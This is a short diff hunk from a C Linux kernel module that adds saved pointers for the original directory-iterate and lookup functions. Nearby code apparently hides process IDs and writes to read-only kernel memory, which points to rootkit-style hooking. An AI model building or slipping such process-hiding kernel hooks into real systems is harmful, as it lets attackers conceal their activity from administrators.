@@ -93,6 +93,14 @@ void clear_hidden_pids(void) {
 
 // --- New implementation using function pointer overwrite ---
 
+// Pointers to store the original functions
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+static int (*original_iterate)(struct file *, struct dir_context *);
+#else
+static int (*original_iterate)(struct file *, void *, filldir_t);
+#endif
+static struct dentry * (*original_lookup)(struct inode *,struct dentry *, unsigned int);
+
 static int write_ro_kernel_data(void *addr, void *new_val_ptr, size_t size)
 {
     pte_t *pte;
